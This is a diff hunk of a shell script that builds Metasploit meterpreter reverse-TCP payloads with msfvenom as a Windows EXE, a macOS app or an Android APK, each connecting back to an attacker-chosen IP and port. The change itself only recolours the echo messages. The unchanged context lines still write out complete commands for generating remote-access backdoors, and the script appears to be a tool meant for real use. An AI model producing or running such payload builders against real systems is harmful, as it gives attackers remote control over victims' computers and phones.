@@ -21,18 +21,18 @@ echo "\033[1;33m:::: Type "a" for ANDROID(.apk)\033[0m"
 read payload_choice
 if [ $payload_choice = "w" ]; then
 	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > ~/msf/temp/$FILE.exe
-	echo "\033[1;33m::::You choose Windows EXE format::::\033[0m"
+	echo "\033[1;34m::::You choose Windows EXE format::::\033[0m"
 fi
 if [ $payload_choice = "m" ]; then
 	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > ~/msf/temp/$FILE.app
-	echo "\033[1;33m::::You choose MacOSX APP format::::\033[0m"
+	echo "\033[1;34m::::You choose MacOSX APP format::::\033[0m"
 fi
 if [ $payload_choice = "a" ]; then
 	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > ~/msf/temp/$FILE.apk
-	echo "\033[1;33m::::You choose Android APK Format::::\033[0m"
+	echo "\033[1;34m::::You choose Android APK Format::::\033[0m"
 fi
 if [ $payload_choice != "a" ] && [ $payload_choice != "m" ] && [ $payload_choice != "w" ]; then
-	echo "\033[1;32mYou didn't choose one of the three formats\nQuitting now.. \033[0m"
+	echo "\033[1;33mYou didn't choose one of the three formats\nQuitting now.. \033[0m"
 	exit
 fi
 echo "\n::::Name of the payload:"
